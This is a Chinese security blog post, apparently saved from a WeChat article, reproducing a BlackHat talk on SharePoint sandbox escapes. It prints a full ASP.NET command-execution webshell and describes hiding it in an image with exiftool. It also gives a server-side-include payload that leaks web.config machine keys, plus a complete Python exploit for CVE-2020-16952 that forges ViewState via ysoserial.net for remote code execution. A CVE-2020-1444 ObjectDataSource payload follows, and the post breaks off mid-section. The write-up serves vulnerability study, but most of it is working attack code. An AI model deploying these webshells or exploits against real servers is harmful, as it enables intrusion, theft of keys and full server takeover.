> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/EzTHXrSF05lDyS7slMHQyg)

   本文为总结类文章，所写皆为对 BlackHat 议题 Munoz-Room-For-Escape-Scribbling-Outside-The-Lines-Of-Template-Security-wp.pdf 的复现学习，国内也有青藤云实验室的复现文章，有兴趣的推荐去看原文。

前置知识

首先，我们要了解的一个东西就是 sharepoint，它是微软用 .net 开发的一套 cms。既然是 cms 肯定允许用户上传，普通用户通过 PUT /my.aspx 的方式就可以上传自己写的任何内容，之后通过 GET /my.aspx 可以看到。虽然我可以在 my.aspx 中写任何内容，但并不是我写的任何内容都会被 SP 服务端解析，这也是其区别于一般 cms 的地方。我们可以通过一个例子来查看这个东西。

测试环境：SharePoint 2016

我这里首先创建了一个门户网站，需要注意的是，在 Sharepoint 中新建网站，默认的存储路径为：

```
C:\inetpub\wwwroot\wss\VirtualDirectories\{端口号}
```

目录结构如下：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08VFKOe4RacJnic1OshImX1LU89Trj7rWD5as6nAUltmTEG2H8vKiaNcLmicXicB3nHKlSGic4DXBWDQLdw/640?wx_fmt=png)

关于 sharepoint 服务器的识别，可以使用 whatcms 等来识别。

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08VFKOe4RacJnic1OshImX1LUASzMSLtQtsNdazFB2wjfmz6apeuUULAwibzo8XafKvJjicC7KHCLFaKA/640?wx_fmt=png)

目录扫描可以使用：

```
gobuster dir -u http://192.168.2.105:8082/ -w /usr/share/seclists/Discovery/Web-Content/CMS/sharepoint.txt
```

假设我们上传上去了一个 aspx 的文档

```
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="c#" runat="server">
void Page_Load(object sender, EventArgs e)
{
}
string ExcuteCmd(string arg)
{
ProcessStartInfo psi = new ProcessStartInfo();
psi.FileName = "cmd.exe";
psi.Arguments = "/c "+arg;
psi.RedirectStandardOutput = true;
psi.UseShellExecute = false;
Process p = Process.Start(psi);
StreamReader stmrdr = p.StandardOutput;
string s = stmrdr.ReadToEnd();
stmrdr.Close();
return s;
}
void cmdExe_Click(object sender, System.EventArgs e)
{
Response.Write("<pre>");
Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));
Response.Write("</pre>");
}
</script>
<HTML>
<HEAD>
<title>awen asp.net webshell</title>
</HEAD>
<body >
<form id="cmd" method="post" runat="server">
<asp:TextBox id="txtArg" style="Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px" runat="server" Width="250px"></asp:TextBox>
<asp:Button id="testing" style="Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px" runat="server" Text="excute" OnClick="cmdExe_Click"></asp:Button>
<asp:Label id="lblText" style="Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px" runat="server">Command:</asp:Label>
</form>
</body>
</HTML>
```

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08VFKOe4RacJnic1OshImX1LUPr7nKmMGapNI6truXoj4ZEFqpb5DM0ksriaKyianaqqHYcydcCbSsicRw/640?wx_fmt=png)

直接访问

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08VFKOe4RacJnic1OshImX1LUhhcrwVdp8YuaocYFicZpT1ThDQqCtzia8nAwKHfqTohq2bwibxNeicwJfw/640?wx_fmt=png)

我们只需要在 PageParserPath 加入下面的代码

```
<PageParserPath
  VirtualPath="/*"
  CompilationMode="Always"
  AllowServerSideScript="true"
  IncludeSubFolders="true" />
```

就可以执行命令了

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08VFKOe4RacJnic1OshImX1LUsuKAgFd2EqF4h507PqGaZ8dPz8iaiawCJEAAr1WHhMHovMfOOLztfx4A/640?wx_fmt=png)

我们也可以使用 jpg 的方法来实现，首先找到一个图片，然后将 webshell 代码，转义出来：

```
<script Language=\"c#\" runat=\"server\">void Page_Load(object sender, EventArgs e){}string ExcuteCmd(string arg){ProcessStartInfo psi = new ProcessStartInfo();psi.FileName = \"cmd.exe\";psi.Arguments = \"/c \"+arg;psi.RedirectStandardOutput = true;psi.UseShellExecute = false;Process p = Process.Start(psi);StreamReader stmrdr = p.StandardOutput;string s = stmrdr.ReadToEnd();stmrdr.Close();return s;}void cmdExe_Click(object sender, System.EventArgs e){Response.Write(\"<pre>\");Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));Response.Write(\"</pre>\");}</script><HTML><HEAD><title>awen asp.net webshell</title></HEAD><body ><form id=\"cmd\" method=\"post\" runat=\"server\"><asp:TextBox id=\"txtArg\" style=\"Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px\" runat=\"server\" Width=\"250px\"></asp:TextBox><asp:Button id=\"testing\" style=\"Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px\" runat=\"server\" Text=\"excute\" OnClick=\"cmdExe_Click\"></asp:Button><asp:Label id=\"lblText\" style=\"Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px\" runat=\"server\">Command:</asp:Label></form></body></HTML>
```

然后使用 exiftool 来将代码插入图片

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08VFKOe4RacJnic1OshImX1LU99eNWmf1vo1eSOcuEE8CbGZmj8GCeHj1sSicZkdzAqzicmxh6k2Kgb6g/640?wx_fmt=png)

若是低版本的 sharepoint 便可以利用该方法执行命令了。其沙箱原理如下：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08VFKOe4RacJnic1OshImX1LU4nomddTEeTnMcMom26Uefy2gLOOqRa9nwoLr3sSUMw1fPwZibLAxBcA/640?wx_fmt=png)

上述逻辑具体是通过

Microsoft.SharePoint.ApplicationRuntime.SPPageParserFilter 来实现，实际上是通过网页文件的 path 来区分：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08VFKOe4RacJnic1OshImX1LUqbOFqYnnOryGLxzRHoqTC3OJmSdtHAIMARO1lj80XX4JZbnb9Y9gfw/640?wx_fmt=png)

如果进入了 if 分支，沙箱就会生效，简称 filter 机制。

但是，在服务端最终用 System.Web.UI.TemplateControl.ParseControl() 解析网页时，如果按照下面的方式使用：

```
ParseControl(content);
ParseControl(content, ?true?);
```

filter 机制就会失效，只有第 2 个参数显示指定为 false 时才 ok，我猜作者大概按照这个思路没有找到直接可用的漏洞，但是发现在 design mode 下，filter 机制都会失效，但是会有新的校验方法：Microsoft.SharePoint.EditingPageParser.VerifyControlOnSafeList()

```
internal static void VerifyControlOnSafeList(string dscXml, RegisterDirectiveManager registerDirectiveManager, SPWeb web, bool blockServerSideIncludes = false)
```

这个方法简称 verify 机制，和 ParseControl 一样，最后一个参数也会影响安全因素，当最后一个参数为 false 时（默认 false），允许使用 include 指令。

反序列化、ViewState 与 MachineKey

推荐文章：https://www.t00ls.net/articles-55183.html

一般情况下，我们拿到 MachineKey，其格式如下：

```
<machineKey validationKey="[String]"  decryptionKey="[String]" validation="[SHA1 | MD5 | 3DES | AES | HMACSHA256 | HMACSHA384 | HMACSHA512 | alg:algorithm_name]"  decryption="[Auto | DES | 3DES | AES | alg:algorithm_name]" />
```

就可以来进行反序列化甚至是 RCE。

CVE-2020-0974

该漏洞为一个 RCE 漏洞，漏洞点在于

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08VFKOe4RacJnic1OshImX1LU7l8OmfzspUjibDjxanhIvs8RtyOtETmBMAI9pbzzyjt5iaocLID8eEicQ/640?wx_fmt=png)

verify 机制中，VerifyControlOnSafeList 方法的 blockServerSideIncludes 参数（最后一个参数）为 false 时允许使用 include 指令。

主要利用思路如下：

```
利用include去读取目标web.config中的MachineKey---->利用key生成可RCE的payload
```

其 exp 如下（引号已转义）：

```
<%@ Register TagPrefix=\"WebPartPages\"
Namespace=\"Microsoft.SharePoint.WebPartPage\" Assembly=\"Microsoft.SharePoint,
Version = 16.0.0.0, Culture = neutral, PublicKeyToken = 71e9bce111e9429c\" %>
<WebPartPages:DataFormWebPart runat = \"server\" Title = \"Title\" DisplayName =
\"Name\" ID = \"id1\" >
<xsl>
<!--#include
file=\"c:/inetpub/wwwroot/wss/VirtualDirectories/80/web.config\"-->
</xsl>
</WebPartPages:DataFormWebPart>
```

打 exp

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08VFKOe4RacJnic1OshImX1LUABt0EEYkEqqR72jlmSA105RayGwHe3ib0V2leSzqmsscaMxibn5iaB4gg/640?wx_fmt=png)

需要进行 html 编码

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08VFKOe4RacJnic1OshImX1LUcAP6Rte0J0GJbsTy9B0aFnqYQmz3U3WcnsI2oxyOHMbawsGged2kQQ/640?wx_fmt=png)

更改目录，这个目录如有需要则只能去进行爆破，没有太好的方法来进行猜解

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08VFKOe4RacJnic1OshImX1LUkcAs50OxGGB9mSGBicuwu8EvvxlPujyicAaPBemia83Gkpp1SPibXxqnxg/640?wx_fmt=png)

得到 machineKey：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08VFKOe4RacJnic1OshImX1LUZpQ4jQDf5nHs1e4shW2nhteAAib8NibRH05Zx6VoryRGXaqibfSp1EAYQ/640?wx_fmt=png)

```
<machineKey validationKey="A2BA2AD5D54775F3F5C669988F8DD2AAF50B218385E9858F3763672F558324CB"
 decryptionKey="128E38A90BC76010195252D42174D84A6299FF15A2659A16E8E15695821DAD01" 
 validation="HMACSHA256" />
```

在 HMACSHA256 加密的情况下，我只需要 validationKey 字段就可以完成反序列化利用。这里一般使用_layouts/15/zoombldr.aspx 来进行反序列化操作。

利用脚本地址如下：

https://srcincite.io/pocs/cve-2020-16952.py.txt ，更改后的脚本如下：

```
#!/usr/bin/python3
"""
Microsoft SharePoint Server DataFormWebPart CreateChildControls Server-Side Include Remote Code Execution Vulnerability
Patch: https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2020-16952

## Summary:

An authenticated attacker can craft pages to trigger a server-side include that can be leveraged to leak the web.config file. The attacker can leverage this to achieve remote code execution.

## Notes:

- this does not require the use of a SharePoint endpoint such as WebPartPagesWebService
- the attacker needs AddAndCustomizePages permission enabled which is the default
- you will need to compile and store ysoserial.net in the same folder as this exploit

## Vulnerability Analysis:

Inside of the Microsoft.SharePoint.WebPartPages.DataFormWebPart we can observe the `CreateChildControls`

```c#
namespace Microsoft.SharePoint.WebPartPages
{
    [XmlRoot(Namespace = "http://schemas.microsoft.com/WebPart/v2/DataView")]
    [ParseChildren(true)]
    [Designer(typeof(DataFormWebPartDesigner))]
    [SupportsAttributeMarkup(true)]
    [AspNetHostingPermission(SecurityAction.LinkDemand, Level = AspNetHostingPermissionLevel.Minimal)]
    [SharePointPermission(SecurityAction.LinkDemand, ObjectModel = true)]
    [AspNetHostingPermission(SecurityAction.InheritanceDemand, Level = AspNetHostingPermissionLevel.Minimal)]
    [SharePointPermission(SecurityAction.InheritanceDemand, ObjectModel = true)]
    public class DataFormWebPart : BaseXsltDataWebPart, IDesignTimeHtmlProvider, IPostBackEventHandler, IWebPartRow, ICallbackEventHandler, IConnectionData, IListWebPart
    {
    
        // ...
        [SharePointPermission(SecurityAction.Demand, ObjectModel = true)]
        protected override void CreateChildControls()
        {
            if (!this.Visible)
            {
                return;
            }
            if (!this.AreAllConsumerInterfacesFulfilled())
            {
                this._deferredXSLTBecauseOfConnections = true;
                return;
            }
            if ((base.DesignMode && this.AllowXSLTEditing) || this._forAJAXDropDown)
            {
                return;
            }
            if (this.IsMondoCAMLWebPart() && !base.DesignMode && !string.IsNullOrEmpty(this.ListName) && !this.IsForm)
            {
                SPContext context = SPContext.GetContext(this.Context, base.StorageKey, new Guid(this.ListName), this.CurrentWeb);
                if (context != null)
                {
                    SPViewContext viewContext = context.ViewContext;
                    if (this is BaseXsltListWebPart)
                    {
                        BaseXsltListWebPart baseXsltListWebPart = this as BaseXsltListWebPart;
                        if (baseXsltListWebPart.view != null)
                        {
                            viewContext.View = baseXsltListWebPart.view;
                        }
                    }
                    if (viewContext != null && base.RenderMode != RenderMode.Design && base.RenderMode != RenderMode.Preview)
                    {
                        viewContext.RedirectIfNecessary();
                    }
                }
            }
            base.CreateChildControls();
            this.AddDataSourceControls();
            UpdatePanel updatePanel = null;
            if (this.AsyncRefresh)
            {
                this.CreateAsyncPostBackControls(ref updatePanel);
                this.AddAutoRefreshTimer(updatePanel);
            }
            if (base.DesignMode || !this.InitialAsyncDataFetch || this.Page == null || this.Page.IsCallback)
            {
                this.EnsureDataBound();                                                                                              // 1
            }
            else
            {
                this._asyncDelayed = true;
                if (this.SPList != null && this.SPList.HasExternalDataSource)
                {
                    this.deferXsltTransform = false;
                    this.EnsureDataBound();
                }
                string text = Utility.MakeLayoutsRootServerRelative("images/gears_an.gif");
                string @string = WebPartPageResource.GetString("DataFormWebPartRefreshing");
                this._partContent = this._partContent + "<div id=\"" + this.dfwpWPDiv + "\" style=\"padding-top:5px;\">";
                string partContent = this._partContent;
                this._partContent = string.Concat(new string[]
                {
                    partContent,
                    "<center><img src='",
                    text,
                    "' alt='",
                    @string,
                    "' style='border-width:0px;' /></center>"
                });
                this._partContent += "</div>";
            }
            this.EditMode = false;
            if (this._partContent != null)
            {
                if (this.IsForm && this.DataSource is SPDataSource && base.PageComponent != null && this.ItemContext != null)
                {
                    this.ItemContext.CurrentPageComponent = base.PageComponent;
                }
                bool flag = this.view != null && base.PageComponent != null;
                if ((this.IsGhosted || flag) && !this.UseSchemaXmlToolbar && this.ToolbarControl != null)
                {
                    if (base.PageComponent != null)
                    {
                        this.ToolbarControl.RenderContext.CurrentPageComponent = base.PageComponent;
                    }
                    if ((this.view == null || !this.view.IsGroupRender) && (!this._asyncDelayed || flag))
                    {
                        if (this.AsyncRefresh && updatePanel != null)
                        {
                            updatePanel.ContentTemplateContainer.Controls.Add(this.ToolbarControl);
                        }
                        else
                        {
                            this.Controls.Add(this.ToolbarControl);
                        }
                    }
                }
                else
                {
                    this.CanHaveServerControls = true;
                }
                if (this.CanHaveServerControls && DataFormWebPart.RunatChecker.IsMatch(this._partContent))                           // 2
                {
                    if (this._assemblyReferences != null && this._partContent != null)
                    {
                        StringBuilder stringBuilder = new StringBuilder();
                        for (int i = 0; i < this._assemblyReferences.Length; i++)
                        {
                            stringBuilder.Append(this._assemblyReferences[i]);
                        }
                        stringBuilder.Append(this._partContent);
                        this._partContent = stringBuilder.ToString();
                    }
                    if (base.Web != null)
                    {
                        EditingPageParser.VerifyControlOnSafeList(this._partContent, null, base.Web, false);                         // 3
                    }
                    if (this.Page.AppRelativeVirtualPath == null)
                    {
                        this.Page.AppRelativeVirtualPath = "~/current.aspx";
                    }
                    bool flag2 = EditingPageParser.VerifySPDControlMarkup(this._partContent);
                    if (flag2)
                    {
                        ULS.SendTraceTag(595161362U, ULSCat.msoulscat_WSS_WebParts, ULSTraceLevel.Medium, "Allow DFWP XSL markup {0} to be parsed without parserFilter.", new object[]
                        {
                            this._partContent
                        });
                    }
                    Control control = this.Page.ParseControl(this._partContent, flag2);                                              // 4
                    SPDataSource spdataSource = this.DataSource as SPDataSource;
                    bool flag3 = false;
                    if (this.view != null && !string.IsNullOrEmpty(this.view.InlineEdit))
                    {
                        flag3 = this.view.InlineEdit.Equals("true", StringComparison.OrdinalIgnoreCase);
                    }
                    SPContext spcontext = null;
                    if (spdataSource != null && base.Web != null && (spdataSource.DataSourceMode == SPDataSourceMode.ListItem || (spdataSource.DataSourceMode == SPDataSourceMode.List && flag3)))
                    {
                        string text3;
                        if (spdataSource.DataSourceMode == SPDataSourceMode.List)
                        {
                            string text2 = (string)this.ParameterValues.Collection["dvt_form_key"];
                            text3 = text2;
                        }
                        else
                        {
                            text3 = spdataSource.ListItemID.ToString(CultureInfo.InvariantCulture);
                        }
                        if (text3 != null)
                        {
                            if (this.FormContexts.ContainsKey(text3))
                            {
                                spcontext = this.FormContexts[text3];
                            }
                            else
                            {
                                spcontext = SPContext.GetContext(this.Context, text3, ((IListWebPart)this).ListId, this.CurrentWeb);
                                this.FormContexts[text3] = spcontext;
                            }
                        }
                    }
                    foreach (object obj in control.Controls)
                    {
                        Control control2 = (Control)obj;
                        this.RecursivelyAddFormFieldContext(control2, spcontext);
                    }
                    if (spcontext != null && spdataSource != null)
                    {
                        spdataSource.ItemContext = spcontext;
                    }
                    if (this.AsyncRefresh && updatePanel != null)
                    {
                        updatePanel.ContentTemplateContainer.Controls.Add(control);                                                    // 5
                    }
                    else
                    {
                        this.AddParsedSubObject(control);
                    }
                    using (IEnumerator enumerator2 = control.Controls.GetEnumerator())
                    {
                        while (enumerator2.MoveNext())
                        {
                            object obj2 = enumerator2.Current;
                            Control control3 = (Control)obj2;
                            this.RecursivelyProcessChildFormControls(control3);
                        }
                        goto IL_632;
                    }
                }
                if (this.AsyncRefresh && updatePanel != null)
                {
                    if (this._listView != null)
                    {
                        updatePanel.ContentTemplateContainer.Controls.Add(this._listView);
                    }
                    else
                    {
                        Literal literal = new Literal();
                        literal.Text = this._partContent;
                        updatePanel.ContentTemplateContainer.Controls.Add(literal);
                    }
                }
                else if (this._listView != null)
                {
                    this.AddParsedSubObject(this._listView);
                }
                else
                {
                    this.AddParsedSubObject(new Literal
                    {
                        Text = this._partContent
                    });
                }
                IL_632:
                this.RemoveViewStateIfEmpty("ParamValues");
                this.RemoveViewStateIfEmpty("FilterOperations");
                this.RemoveViewStateIfEmpty("IntermediateFormActions");
                this.RemoveViewStateIfEmpty("OriginalValues");
                this._partContent = null;
                this._listView = null;
            }
            this._asyncDelayed = false;
        }
```

At *[1]*, the code performs a databind and accesses the data from the datasource (in this case it's our controlled serverside http header). The data returned must be valid xml so that it can be processed via our crafted xslt. Then at *[2]* the code calls `DataFormWebPart.RunatChecker.IsMatch` on our controlled `_partContent`. This checks for an instance of `runat=server` in the supplied xml. However, we can't put that in there because we can't register any prefixes (registration is probably not possible due to the <% not being a valid xml tag). But I found a way to pass the check by using HTML server controls which can include a `runat=server`.

At *[3]* the code calls `VerifyControlOnSafeList` with the false flag, meaning our input can use server-side includes. Lucky for us, includes are valid xml, so we can stuff them into our `_partContent` and later at *[4]* they are parsed and finally added to the page at *[5]*.

This allows an us to leak the complete `web.config` file, including the Validation Key which is enough to generate a malicious serialized viewState and trigger rce via deserialization.

## Fingerprint:

For detecting vulnerable versions before exploitation, you can use this:

```
PUT /poc.aspx HTTP/1.1
Host: [target]
Content-Length: 67

<asp:Literal runat="server" Text="<%$SPTokens:{ProductNumber}%>" />
```

Then https://[target]/poc.aspx should return 16.0.10364.20001.

## Credit:

Steven Seeley (mr_me) of Qihoo 360 Vulcan Team

## Example:

For testing, download ysoserial.net and store it in a folder called `yss`.

researcher@DESKTOP-H4JDQCB:~$ ./poc.py
(+) usage: ./poc.py <SPSite> <user:pass> <cmd>
(+) eg: ./poc.py win-3t816hj84n4 harryh@pwn.me:user123### mspaint
(+) eg: ./poc.py win-3t816hj84n4/sites/test harryh@pwn.me:user123### notepad

researcher@DESKTOP-H4JDQCB:~$ ./poc.py win-3t816hj84n4 harryh@pwn.me:user123### notepad
(+) leaked validation key: 55AAE0A8E646746523FA5EE0675232BE39990CDAC3AE2B0772E32D71C05929D8
(+) triggering rce, running 'cmd /c notepad'
(+) done! rce achieved
"""
import os
import re
import sys
import urllib3
import requests
import subprocess
from platform import uname
from requests_ntlm2 import HttpNtlmAuth
from urllib.parse import urlparse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def put_page(target, domain, user, password):
    payload = """<WebPartPages:DataFormWebPart runat="server">
<ParameterBindings>
  <ParameterBinding  />
</ParameterBindings>
  <xsl>
    <xsl:stylesheet xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
      <xsl:param  />
      <xsl:template match="/">
        <xsl:value-of select="$ssi" disable-output-escaping="yes" />
      </xsl:template>
    </xsl:stylesheet>
  </xsl>
</WebPartPages:DataFormWebPart>"""
    r = requests.put("http://%s/poc.aspx" % target, data=payload, auth=HttpNtlmAuth('%s\\%s' % (domain, user), password))
    assert (r.status_code == 200 or r.status_code == 201), "(-) page creation failed, user doesn't have site ownership rights!"

def get_vkey(target, domain, user, password):
    h = { "360Vulcan": "<form runat=\"server\" /><!--#include virtual=\"/web.config\"-->" }
    r = requests.get("http://%s/poc.aspx" % target, auth=HttpNtlmAuth('%s\\%s' % (domain, user), password), headers=h)
    match = re.search("machineKey validationKey=\"(.{64})", r.text)
    assert match, "(-) unable to leak the validation key, exploit failed!"
    return match.group(1)

def trigger_rce(target, domain, path, user, password, cmd, key):
    out = subprocess.Popen([
        'yss/ysoserial.exe', 
        '-p', 'ViewState',
        '-g', 'TypeConfuseDelegate',
        '-c', '%s' % cmd,
        '--apppath=%s' % path,
        '--path=%s_layouts/15/zoombldr.aspx' % path,
        '--islegacy',
        '--validationalg=HMACSHA256',
        '--validationkey=%s' % key
    ], stdout=subprocess.PIPE)
    rce = { "__VIEWSTATE" : out.communicate()[0].decode() }
    requests.post("http://%s/_layouts/15/zoombldr.aspx" % target, data=rce, auth=HttpNtlmAuth('%s\\%s' % (domain, user), password))

def main():
    if len(sys.argv) != 4:
        print("(+) usage: %s <SPSite> <user:pass> <cmd>" % sys.argv[0])
        print("(+) eg: %s win-3t816hj84n4 harryh@pwn.me:user123### mspaint" % sys.argv[0])
        print("(+) eg: %s win-3t816hj84n4/sites/test harryh@pwn.me:user123### notepad" % sys.argv[0])
        sys.exit(-1)
    target = sys.argv[1]
    user = sys.argv[2].split(":")[0].split("@")[0]
    password = sys.argv[2].split(":")[1]
    domain = sys.argv[2].split(":")[0].split("@")[1]
    cmd = sys.argv[3]
    path = urlparse("http://%s" % target).path or "/"
    path = path + "/" if not path.endswith("/") else path
    ##put_page(target, domain, user, password)
    key = "A2BA2AD5D54775F3F5C669988F8DD2AAF50B218385E9858F3763672F558324CB"
    print("(+) leaked validation key: %s" % key)
    print("(+) triggering rce, running 'cmd /c %s'" % cmd)
    trigger_rce(target, domain, path, user, password, cmd, key)
    print("(+) done! rce achieved")

if __name__ == '__main__':
    if "microsoft" not in uname()[2].lower():
        print("(-) WARNING - this was tested on wsl, so it may not work on other platforms")
    if not os.path.exists('yss/ysoserial.exe'):
        print("(-) missing ysoserial.net!")
        sys.exit(-1)
    main()
```

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08VFKOe4RacJnic1OshImX1LUDjiaNGZoGrh0uOeCG5QPHkYH4lCSSjCaHmzibibGuvoV99gxvUNyatBuQ/640?wx_fmt=png)

成功 RCE

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08VFKOe4RacJnic1OshImX1LUCK7XPVO92YLsiak0paM7AUianiaESPrbh1kINUXfPwfr3ebhbEqToRy1w/640?wx_fmt=png)

**CVE-2019-0604**

推荐之前的文章 [CVE-2019-0604 分析及武器化](http://mp.weixin.qq.com/s?__biz=MzU0MjUxNjgyOQ==&mid=2247487333&idx=1&sn=1d106c99c8e9b451a1d72500517cde1b&chksm=fb183c57cc6fb541fef04e53c83d6c74f3d8b2c3fa398e075e3baecbd770068ad03374a93cea&scene=21#wechat_redirect)

**CVE-2020-1444**

测试环境：

*   Server2016
    
*   SP2016
    
*   dnSpy
    

背景知识

ObjectDataSource

通过 ObjectDataSource 定义知道在 asp.net 中 ObjectDataSource 可以调用任意运行时方法，类似 ObjectDataProvider

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08VFKOe4RacJnic1OshImX1LU74YCDrPS9KBvdg70sDO2e8fkZg9bT9ZbqcOK8YYEKYuBtbT7bwtFNA/640?wx_fmt=png)

Asp.Net 的内联表达式

<%-- ... -- %> 表示注释

<%@ ... %> 表示指令

刚刚的代码如下：

```
<%@ Register TagPrefix="asp3" Namespace="System.Web.UI.WebControls" Assembly="System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" %>

<asp3:ObjectDataSource ID="ODS1" runat="server" SelectMethod="Start" Type >
  <SelectParameters>
    <asp3:Parameter Direction="input" Type="string" />
  </SelectParameters>
</asp3:ObjectDataSource>
<asp3:ListBox ID="LB1" runat="server" DataSourceID = "ODS1" />
```

Register 类似于 python 中的 Import，这里就是引用命名空间：System.Web.UI.WebControls，并命名别名为 asp3。之后的 < asp3:ObjectDataSource，则表示调用 System.Web.UI.WebControls 下面的 ObjectDataSource，这里即为 asp3。

关于该方法，官方文档地址为：https://docs.microsoft.com/zh-cn/dotnet/api/system.web.ui.webcontrols.objectdatasource?view=netframework-4.8

其构造方法如下：

```
public ObjectDataSource (string typeName, string selectMethod);
```

漏洞原理

漏洞位置：/_layouts/15/WebPartEditingSurface.aspx

借议题的图：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08VFKOe4RacJnic1OshImX1LU4vib1tLhybCxGItvUAUKPL81yKOxvricM2DzuLfgf5ASC3fspw7Cv1YQ/640?wx_fmt=png)

用户输入在经过服务端校验后，被服务端修改后再使用，这个顺序显然是有问题的，也是漏洞成因，具体到代码里

```
//Microsoft.SharePoint.Publishing.Internal.CodeBehind.WebPartEditingSurfacePage
```

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08VFKOe4RacJnic1OshImX1LUgjThmfHbBdNzFsic0eaPOdsz2qZUSMXyAqC1a6WsoicxeswkkSJWpgag/640?wx_fmt=png)

注意，在 ParseControl 使用时没用加上第二个参数。而按照之前所说，这样就会造成沙箱逃逸。

整个漏洞流程如下：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08VFKOe4RacJnic1OshImX1LUworAyM3TOHR46riaQ7qkacHRRcFjprTO2cPlbHlhBlZcI62PpibXRnhA/640?wx_fmt=png)

其主要问题点 ConvertMarkupToTree，着重分析一下，须提供的参数：WebPartUrl 和 Url

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08VFKOe4RacJnic1OshImX1LUFmYnYicJb7icVFjfx7RGLz5MDJzaibvKXf6opGafDmp2JDZxqbqT8wfWg/640?wx_fmt=png)

Url 参数暂时不管，在后面漏洞利用章节会去讨论。通过对代码 trace 可以发现 WebPartUrl 指向的文件必须是一个 xml，这个 xml 还有其他要求，暂且不提。从服务端取参到 ConvertMarkupToTree 的处理步骤是：

*   取参（url of xml）
    
*   通过 web 获取 xml 的字符串流（GetWebPartMarkup）
    
*   对字符串流做一些预处理，包括校验（ConvertWebPartMarkup）
    
*   将字符串流转成 xml 树（ConvertMarkupToTree)
    
*   经过各种处理，将 xml 树 转回字符串流（xelement2.ToString）
    
*   网页解析（ParseControl）
    

从上面可以看出 string -> xml tree 发生在校验之后，看看具体做了哪些事

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08VFKOe4RacJnic1OshImX1LUb4uOvLfB04okwkR03rcnooAiarhPSnwvpjsdMvuzrJRuKwMmAvOFo2Q/640?wx_fmt=png)

正则如下：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08VFKOe4RacJnic1OshImX1LUtA5aWahKRrTuzHajJ4sWgz7vf6Ds9t3LGFyO96uVaOCRp5B1Em6icZA/640?wx_fmt=png)

这个正则匹配的是内联表达式中的 Register 指令，有两个命名捕获：TagPrefix 和 DllInfo。

TagPrefix 用正则捕获，DllInfo 是 TagPrefix 之后的所有内容。比如下面的例子：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08VFKOe4RacJnic1OshImX1LUALM1e5dQKfQRMn5CT6icUhenpnZsM6NvFENTjhlu0vL9MdCd20icxUSA/640?wx_fmt=png)

漏洞利用

```
<%@ Register TagPrefix="WebPartPages"
Namespace="Microsoft.SharePoint.WebPartPage" Assembly="Microsoft.SharePoint,
Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c" %>
<%@ Register TagPrefix="SearchW"
Namespace="Microsoft.Office.Server.Search.WebControls"
Assembly="Microsoft.Office.Server.Search, Version=16.0.0.0, Culture=neutral,
PublicKeyToken=71e9bce111e9429c" %>
<%@ Register TagPrefix="asp3" Namespace="System.Web.UI.WebControls"
Assembly="System.Web, Version=4.0.0.0, Culture=neutral,
PublicKeyToken=b03f5f7f11d50a3a" %>
<SearchW:DataProviderScriptWebPart ID="DPSWebPart1" runat="server" />
<div id="cdata1"><![CDATA[
<%-- prefix
--%<%@ Register TagPrefix="asp" Namespace="System.Web.UI.WebControls"
Assembly="System.Web, Version=4.0.0.0, Culture=neutral,
PublicKeyToken=b03f5f7f11d50a3a" %>>
<asp3:ObjectDataSource ID="ODS1" runat="server" SelectMethod="Start"
Type >
<SelectParameters>
<asp3:Parameter Direction="input" Type="string" 
DefaultValue="calc"/>
</SelectParameters>
</asp3:ObjectDataSource>
<asp3:ListBox ID="LB1" runat="server" DataSourceID = "ODS1" />
<%-- sufix
--%>
]]></div>
```

利用过程跟 CVE-2020-16951 类似，都是先将 POC 的 xmlput 上去，然后再访问指定的 url 来进行触发。

参数可以在母版页找到

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08VFKOe4RacJnic1OshImX1LUa7FJG8ATlL980Ogz3j3Mtic3B5y1Fav29Tibiao3l82c3hMmRC2fXVpWA/640?wx_fmt=png)

上传成功

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08VFKOe4RacJnic1OshImX1LUVj2QkNTxJiam5K6OZRDD0ZeyCnJ9Zl2iciahibWwoZibY73cORZ4eicytsgg/640?wx_fmt=png)

下面就是访问指定链接的问题了

```
